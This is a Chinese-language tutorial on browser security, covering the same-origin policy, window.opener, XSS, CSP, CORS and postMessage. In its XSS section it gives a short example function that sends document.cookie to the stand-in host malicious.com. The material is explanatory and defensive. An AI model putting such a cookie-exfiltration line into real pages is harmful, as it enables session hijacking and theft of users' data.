## 一、浏览器安全

无风险的世界不存在，包括浏览器，我们知道Web世界是开放的，包容的。但是开放和风险是对立的。

Web 世界会是开放的，任何资源都可以接入其中，我们的网站可以加载并执行别人网站的脚本文件、图片、音频 / 视频等资源，甚至可以下载其他站点的可执行文件。

比如你打开了一个银行站点，然后又一不小心打开了一个恶意站点，如果没有安全措施，恶意站点就可以做很多事情：
- 修改站点的 DOM、CSSOM 等信息；
- 在银行站点内部插入 JavaScript 脚本；
- 劫持用户登录的用户名和密码；
- 读取银行站点的 Cookie、IndexDB 等数据；
- 甚至还可以将这些信息上传至自己的服务器，这样就可以在你不知情的情况下伪造一些转账请求等信息。

在没有安全保障的 Web 世界中，我们是没有隐私的，因此需要安全策略来保障我们的隐私和数据的安全，这就引出了页面中最基础、最核心的安全策略，同源策略（Same-origin policy）

浏览器安全可以分为三大块——Web 页面安全、浏览器网络安全、浏览器系统安全


![image.png](https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/c2f93c6deb6f4f9d82c5baf593e1ff68~tplv-k3u1fbpfcp-watermark.image?)

## 二、浏览器是如何工作的

思考几个问题：
- 为什么某些页面会崩溃？
- 为什么页面崩溃后重新打开就正常了？
- 为什么单个tab页面、插件崩溃不会影响其他Tab？
- 为什么有时候浏览器突然退出？


![image.png](https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/fadd1da2be7c4d0bbd387f00f90ec2ba~tplv-k3u1fbpfcp-watermark.image?)

浏览器的单进程架构和多进程架构

![image.png](https://cdn.jsdelivr.net/gh/richLpf/pictures@main/gitbook/1639462591891%E5%90%8C%E6%BA%90.png)

单进程架构：不稳定，不安全，所有的处理都在一个进程中，某个线程出现问题，浏览器就会崩溃

多进程架构：不同功能的进程相互分离，每个页面都会有一个渲染进程，做到了进程隔离，某个进程的奔溃不会导致整个浏览器的崩溃


## 三、什么同源策略？

如果两个 URL 的`协议`、`域名`和`端口`都相同，我们就称这两个 URL 同源

```
http://ux.admin.com/task
http://wx.admin.com/ticket
https://ux.admin.com/ticket
http://csm.admin.com/dashboard
https://ux.admin.com:8080/api
```
浏览器默认两个相同的源之间是可以相互访问资源和操作 DOM 的。

### 1、Dom安全

**通过window.open打开页面相同域名下的页面**

![操作常见的源](https://cdn.jsdelivr.net/gh/richLpf/pictures@main/gitbook/1639494796405open1.png)

**点击window.open按钮，打开相同域名下的页面**

![点击open打开](https://cdn.jsdelivr.net/gh/richLpf/pictures@main/gitbook/1639494804674open2.png)

**此时在子页面中通过window.opener操作父页面中的Dom，发现生效**

![在子页面中操作dom](https://cdn.jsdelivr.net/gh/richLpf/pictures@main/gitbook/1639494813242open3.png)

**同样的方式，window.open打开不同域名下的页面，同样通过window.opener操作，返现报跨域错误**

![相同的方式操作不同域名下的页面](https://cdn.jsdelivr.net/gh/richLpf/pictures@main/gitbook/1639494825458open4.png)

所以为了安全起见，通过window.open打开页面可以增加代码，阻止子页面操作dom

```js
const win = window.open("http://localhost:9000/index.html")
win.opener = null
```



### 2、数据层面。

同源策略限制了不同源的站点读取当前站点的 Cookie、IndexDB、LocalStorage 等数据。由于同源策略，我们依然无法通过第二个页面的 opener 来访问第一个页面中的 Cookie、IndexDB 或者 LocalStorage 等内容。

### 3、网络层面。

同源策略限制了通过 XMLHttpRequest 等方式将站点的数据发送给不同源的站点。你还记得在

![image.png](https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/04f27ce76e2e4714a6d3b10f40c782ba~tplv-k3u1fbpfcp-watermark.image?)
![image.png](https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/b506a5bebe534d8aa30ac41ecf923593~tplv-k3u1fbpfcp-watermark.image?)

以上就是同源策略，同源策略会隔离不同源的Dom、数据和网络通信等。

但在实际工作中，常常需要不同域名进行访问，不同资源的访问，所以为了发展，就需要出让一些安全策略，满足发展的需要。

## 四、同源策略带来的一些问题

### 1、页面中可以嵌入第三方资源

Web 世界是开放的，可以接入任何资源，而同源策略要让一个页面的所有资源都来自于同一个源，也就是要将该页面的所有 HTML 文件、JavaScript 文件、CSS 文件、图片等资源都部署在同一台服务器上，这无疑违背了 Web 的初衷，也带来了诸多限制。

比如将不同的资源部署到不同的 CDN 上时，CDN 上的资源就部署在另外一个域名上，因此我们就需要同源策略对页面的引用资源开一个“口子”，让其任意引用外部文件。

比如，恶意程序在 HTML 文件内容中插入如下一段 JavaScript 代码：

![](https://cdn.jsdelivr.net/gh/richLpf/pictures@main/gitbook/1639461015639xss2.png)

当这段 HTML 文件的数据被送达浏览器时，浏览器是无法区分被插入的文件是恶意的还是正常的，这样恶意脚本就寄生在页面之中，当页面启动时，它可以修改用户的搜索结果、改变一些内容的连接指向，等等。


除此之外，它还能将页面的的敏感数据，如 Cookie、IndexDB、LoacalStorage 等数据通过 XSS 的手段发送给服务器。具体来讲就是，当你不小心点击了页面中的一个恶意链接时，恶意 JavaScript 代码可以读取页面数据并将其发送给服务器，如下面这段伪代码：

```js
function onClick(){ 
    let url = `http://malicious.com?cookie = ${document.cookie}` 
    open(url)
}

onClick()
```

在这段代码中，恶意脚本读取 Cookie 数据，并将其作为参数添加至恶意站点尾部，当打开该恶意页面时，恶意服务器就能接收到当前用户的 Cookie 信息。

以上就是一个非常典型的 XSS 攻击。为了解决 XSS 攻击，浏览器中引入了内容安全策略，称为 CSP。

CSP 的核心思想是让服务器决定浏览器能够加载哪些资源，让服务器决定浏览器是否能够执行内联 JavaScript 代码

通过这些手段就可以大大减少 XSS 攻击。

### 2、跨域资源共享

为了解决这个问题，我们引入了跨域资源共享（CORS)

使用该机制可以进行跨域访问控制，从而使跨域数据传输得以安全进行。

正常情况下发送跨域请求，浏览器自动添加Origin字段，告诉服务器本次请求的协议、域名和端口号

```
GET /cors HTTP/1.1
Origin: http://api.bob.com
Host: api.alice.com
Accept-Language: en-US
Connection: keep-alive
User-Agent: Mozilla/5.0...
```
返回相应头中包含了可以允许跨域的信息，如果响应头中没有包含Access-Control-Allow-Origin，就可能出现错误
```
Access-Control-Allow-Origin: http://api.bob.com
Access-Control-Allow-Credentials: true
Access-Control-Expose-Headers: FooBar
Content-Type: text/html; charset=utf-8
```
withCredentials

CORS请求默认不发送Cookie和HTTP认证信息

如果要发送服务器，服务器和客户端都要增加参数

```
Access-Control-Allow-Credentials: true
```

```
var xhr = new XMLHttpRequest();
xhr.withCredentials = true;
```


### 3、跨文档消息机制

可以通过 window.postMessage 的 JavaScript 接口来和不同源的 DOM 进行通信。


```js
/*
 * A窗口的域名是<http://example.com:8080>，以下是A窗口的script标签下的代码：
 */

var popup = window.open(...popup details...);

// 如果弹出框没有被阻止且加载完成

// 这行语句没有发送信息出去，即使假设当前页面没有改变location（因为targetOrigin设置不对）
popup.postMessage("The user is 'bob' and the password is 'secret'",
                  "https://secure.example.net");

// 假设当前页面没有改变location，这条语句会成功添加message到发送队列中去（targetOrigin设置对了）
popup.postMessage("hello there!", "http://example.org");

function receiveMessage(event)
{
  // 我们能相信信息的发送者吗?  (也许这个发送者和我们最初打开的不是同一个页面).
  if (event.origin !== "http://example.org")
    return;

  // event.source 是我们通过window.open打开的弹出页面 popup
  // event.data 是 popup发送给当前页面的消息 "hi there yourself!  the secret response is: rheeeeet!"
}
window.addEventListener("message", receiveMessage, false);

```


## 五、小结

![image.png](https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/0c6dcc8f3ce74d96b1fd195f75e1d826~tplv-k3u1fbpfcp-watermark.image?)


## 六、参考文章
- [阮一峰CORS](http://www.ruanyifeng.com/blog/2016/04/cors.html)
- [csp](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CSP)
